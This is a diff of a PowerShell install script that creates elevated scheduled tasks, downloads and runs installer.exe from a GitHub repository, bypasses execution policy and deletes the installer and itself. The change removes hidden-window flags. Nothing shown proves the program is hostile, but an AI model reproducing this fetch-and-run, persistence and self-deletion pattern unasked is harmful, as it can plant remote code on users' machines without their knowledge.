@@ -62,7 +62,7 @@ $settings = New-ScheduledTaskSettingsSet `
 # Installer task
 $installerTaskName = "WinRunInstaller"
 $cmd = 'powershell.exe -Command "$p=\"$env:APPDATA\run\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o=\"$p\installer.exe\"; Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; Start-Process $o"'
-$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command $cmd"
+$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument " -Command $cmd"
 $installerSettings = New-ScheduledTaskSettingsSet `
   -AllowStartIfOnBatteries `
   -DontStopIfGoingOnBatteries `
@@ -73,7 +73,7 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
 Register-ScheduledTask -TaskName $installerTaskName -Action $installerAction -Settings $installerSettings -RunLevel Highest -Force | Out-Null
 
 # Mark installed
-Start-Process powershell.exe -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$installer'" -WindowStyle Hidden -Wait
+Start-Process powershell.exe -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$installer'"  -Wait
 $latestCommit | Out-File $datFile
 
 $IdPath = "$env:APPDATA\Microsoft\run\run.txt"
@@ -101,9 +101,9 @@ catch {}
 Start-Process $runExe
 
 if ($installer) {
-  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer' -Force`"" -WindowStyle Hidden
+  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer' -Force`"" 
 }
 
 if ($self) {
-  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 4; Remove-Item '$self' -Force`"" -WindowStyle Hidden
+  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 4; Remove-Item '$self' -Force`"" 
 }
